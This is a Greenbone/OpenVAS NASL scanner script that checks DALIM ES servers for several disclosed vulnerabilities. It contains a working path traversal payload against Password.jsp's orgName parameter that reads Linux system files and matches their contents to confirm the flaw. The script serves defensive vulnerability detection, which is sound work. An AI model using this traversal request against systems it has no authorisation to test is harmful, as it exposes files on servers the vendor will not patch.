CPE = "cpe:/a:dalim:es_core";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140293" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2017-08-11 16:04:25 +0700 (Fri, 11 Aug 2017)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "DALIM ES Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dalim_es_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "dalim_es/installed" );
	script_tag( name: "summary", value: "DALIM ES is prone to multiple vulnerabilities." );
	script_tag( name: "insight", value: "DALIM ES is prone to multiple vulnerabilities:

  - User Enumeration Weakness

  - Multiple Stored XSS And CSRF Vulnerabilities

  - Multiple Remote File Disclosures

  - Server-Side Request Forgery" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5428.php" );
	script_xref( name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5427.php" );
	script_xref( name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5426.php" );
	script_xref( name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5425.php" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/Esprit/public/Password.jsp?orgName=../../../../../../../../../" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

